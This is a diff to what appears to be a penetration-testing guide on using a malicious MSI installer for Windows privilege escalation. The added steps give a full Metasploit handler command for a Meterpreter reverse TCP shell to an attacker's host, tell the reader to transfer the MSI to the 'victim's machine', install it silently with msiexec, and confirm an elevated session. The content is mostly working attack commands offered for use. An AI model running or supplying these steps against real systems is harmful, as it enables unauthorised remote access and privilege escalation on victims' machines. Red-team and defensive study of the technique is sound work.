@@ -201,6 +201,28 @@ To create a malicious MSI in Visual Studio foolow the below steps:
 
 9)  Build the solution.
 
+10) Configure Metasploit's handler according to your selected MSI payload preferences:
+
+```
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip_address>; set LPORT <port>; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
+```
+
+![Metasploit-Configuration](/Pictures/Metasploit-Configuration.png)
+
+11) Transfer the malicious MSI file to the victim's machine.
+
+12) Initiate the installation process for the malicious MSI package silently without any user interface:
+
+```
+msiexec /quiet /qn /i NCVInstaller.msi
+```
+
+![MSI-Execution](/Pictures/MSI-Execution.png)
+
+13) Confirm that the new session is with elevated privileges:
+
+![Elevated-Privileges-Confirmation](/Pictures/Elevated-Privileges-Confirmation.png)
+
 ##### Tool Exploitation
 
 1) To perform exploitation with [msfvenom](https://github.com/rapid7/metasploit-framework), you can use the following command to create a malicious MSI file:
